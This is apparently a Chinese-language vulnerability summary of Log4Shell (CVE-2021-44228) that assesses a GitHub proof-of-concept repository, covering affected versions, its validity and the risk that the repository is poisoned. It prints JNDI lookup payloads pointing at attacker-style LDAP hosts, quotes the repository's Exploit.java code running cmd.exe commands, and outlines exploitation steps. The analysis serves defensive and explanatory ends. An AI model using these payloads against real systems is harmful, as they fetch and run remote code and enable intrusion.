## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 应用程序使用受影响版本的Log4j2，并允许攻击者控制Log4j2可以记录的日志消息。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI特性，该特性允许从LDAP和其他JNDI相关端点加载代码。攻击者可以通过控制Log4j2记录的日志消息或日志消息参数，注入恶意的JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`。当Log4j2解析包含恶意JNDI查找的日志消息时，它将尝试连接到攻击者控制的LDAP服务器，并下载并执行恶意代码。 

**有效性：**
提供的POC代码是有效的，它演示了如何利用该漏洞。`log4j.java`文件中的代码设置了`com.sun.jndi.ldap.object.trustURLCodebase`和`com.sun.jndi.rmi.object.trustURLCodebase`为`true`, 这使得可以通过JNDI注入执行远程代码。它记录了一个包含JNDI查找字符串的错误信息`${jndi:ldap://testgames.me:1389/Exploit}`，这将触发Log4j2尝试从`testgames.me`下载和执行代码。

**投毒风险：**
此仓库中存在一定的投毒风险。`Exploit.java` 文件包含以下可疑代码：
```java
Runtime.getRuntime().exec("cmd.exe /c mshta vbscript:msgbox(\"少爷，该启动原神了\",64,\"来自log4j的消息\"(window.close)");
String shortcutPath = "C:\\Users\\此处填写用户文件夹名\\Desktop\\原神.lnk";
Runtime.getRuntime().exec("cmd.exe /c start " + shortcutPath);
```
这段代码的意图是弹出一个消息框，内容为“少爷，该启动原神了”，并尝试启动桌面上的“原神.lnk”快捷方式。这可能是一种幽默的恶作剧，但也可能被用于更恶意的目的，例如，如果“原神.lnk”快捷方式被替换为指向恶意程序的快捷方式。此外，代码中包含硬编码的用户名路径“C:\Users\此处填写用户文件夹名\Desktop\原神.lnk”，这表明代码可能未经过充分测试，或者作者可能希望用户在未经仔细检查的情况下直接使用代码。

**利用方式：**
1.  **找到易受攻击的应用程序：** 找到使用Apache Log4j2库的应用程序，并且该应用程序记录用户可控的输入。
2.  **注入恶意JNDI查找：** 将包含恶意JNDI查找的字符串（例如`${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的输入中。这可以通过多种方式完成，例如，通过HTTP请求头、表单字段或任何其他应用程序记录的输入。
3.  **LDAP服务器响应：** 设置一个恶意的LDAP服务器，该服务器提供一个包含恶意代码的Java类。
4.  **代码执行：** 当Log4j2解析包含恶意JNDI查找的日志消息时，它将连接到攻击者的LDAP服务器，下载恶意Java类，并执行其中的代码。

根据文件内容和代码意图分析，初步估计投毒风险约为20%，主要是 `Exploit.java` 中的“原神”相关代码的潜在恶意利用可能性，以及硬编码路径带来的风险。


**项目地址:** [Super-Binary/cve-2021-44228](https://github.com/Super-Binary/cve-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)